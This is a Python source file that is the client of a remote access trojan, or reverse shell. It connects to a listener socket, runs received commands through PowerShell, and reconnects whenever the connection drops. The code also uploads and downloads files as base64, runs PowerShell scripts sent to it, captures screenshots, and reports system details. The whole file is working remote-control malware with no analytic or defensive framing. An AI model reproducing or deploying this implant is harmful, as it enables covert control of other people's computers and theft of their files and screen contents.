import socket
from termcolor import colored
import os
import subprocess
import json
import base64
import time
import platform
from PIL import Image, ImageGrab
import io
# -------------------------------------------------------------------------------


def reliable_send(data):
    json_data = json.dumps(data)
    json_bytes = json_data.encode()

    # Send the data in chunks to handle larger data
    chunk_size = 1024
    total_bytes_sent = 0
    while total_bytes_sent < len(json_bytes):
        chunk = json_bytes[total_bytes_sent:total_bytes_sent + chunk_size]
        bytes_sent = s.send(chunk)
        if bytes_sent == 0:
            # The socket has been closed, or there was an issue with the connection.
            raise ConnectionError("Socket connection closed or encountered an issue.")
        total_bytes_sent += bytes_sent


def reliable_receive(s):
    json_data = b""
    while True:
        chunk = s.recv(1024)
        if not chunk:
            raise ConnectionError("Socket connection closed or encountered an issue.")
        json_data += chunk
        try:
            decoded_data = json.loads(json_data.decode())
            return decoded_data
        
        except json.JSONDecodeError:
            continue


# Read file For Upload To Listener
def read_file(path):
    try:
        path = os.path.normpath(path)
        with open(path, "rb") as file:
            return base64.b64encode(file.read()).decode()
    except Exception as e:
        return ("[Error] " + str(e)[10:])

# Download File From Listener
def write_file(path, content): 
    try:
        # desktop_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
        # file_path = os.path.join(desktop_path, path)
        # print(desktop_path)
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Upload successful"
    except Exception as e:
        return ("[Error] Upload Unsuccessful")

def take_screenshot_and_convert_to_string():
    try:
        screenshot = ImageGrab.grab()
        buffered = io.BytesIO()
        screenshot.save(buffered, format="PNG")
        screenshot_string = base64.b64encode(buffered.getvalue()).decode()
        return screenshot_string 
    except ImportError:
        return "[Error]: PIL (Python Imaging Library) or ImageGrab module is not installed."
    except Exception as e:
        return f"[Error] occurred: {str(e)}"


# -------------------------------------------------------------------------------

def socket_create():
    try:
        global host
        global port
        global s
        host = '127.0.0.1'
        port = 5555
        s = socket.socket()
    except socket.error as msg:
        print("Socket creation error: " + str(msg))

# Connect to a remote socket


def socket_connect():
    try:
        global host
        global port
        global s
        s.connect((host, port))
    except socket.error as msg:
        print("Socket connection error: ", str(msg))
        time.sleep(5)
        socket_create()


# Receive command from remote server and run on local machine
def receive_commands():
    while True:
        # data = s.recv(20480).decode()
        received_command = reliable_receive(s)
        print(received_command)

        if received_command[0] == 'cd':
            try:
                os.chdir(received_command[1])
            except:
                pass

        elif received_command[0] in ['quit', 'exit']:
            s.close()
            break

        elif received_command[0] == "upload":
            file_path = received_command[2]
            file_name = os.path.basename(received_command[1])

            file_path = os.path.join(file_path, file_name)
            command_result = write_file(path=file_path, content=received_command[3])

        elif received_command[0] == "run":
            command_result = run_powerShell_script(data=received_command[2])

        elif received_command[0] == "download":
            command_result = read_file(received_command[1])
            
        elif received_command[0] == "screen-shot":
            command_result = take_screenshot_and_convert_to_string()

        else:
            command_result = execute_command(received_command)

        if received_command[0] == "whoami":
            reliable_send(get_system_info())
        else:
            reliable_send([command_result, "[ " + os.getcwd() + " ]>"])

    s.close()

# run powerShell script


def run_powerShell_script(data):
    try:
        desktop_path = os.path.join(os.path.join(
            os.environ['USERPROFILE']), 'Desktop')
        file_path = os.path.join(desktop_path, "test.ps1")

        write_file(path=file_path, content=data)
        result = execute_command("PowerShell -File " + file_path)
        os.remove(file_path)
        return result
    except Exception as ex:
        return ("[Error] from run powershell script \n" + str(ex))


def get_system_info():
    sysInfo = platform.uname()
    USER = "?"
    SYSTEM = "?"
    VERSION = "?"
    try:
        USER = sysInfo.node
        SYSTEM = sysInfo.system
        VERSION = sysInfo.version
    except:
        pass

    return [USER, SYSTEM, VERSION]

# Execute command

def execute_command(received_command):
    try:
        powerShell_command = ["powershell", "-command", " ".join(received_command)]
        result = subprocess.run(
            powerShell_command, capture_output=True, text=True)

        if result.returncode == 0:
            # execute was success
            output_str = result.stdout
        else:
            # execute was failed
            output_str = result.stderr

        return output_str

    except Exception as ex:
        output_str = "Error from execute_command function"
        print(colored(output_str, "red"))
        print(colored(ex, "yellow"))
        return output_str + str(ex)




def main():
    while True:
        global s
        try:
            socket_create()
            socket_connect()

            try:
                receive_commands()
            except Exception as ex:
                continue

        except socket.error as ex:
            print(colored("Error in main", "red"))
            print(ex)
            time.sleep(5)

        s.close()
        main()


main()
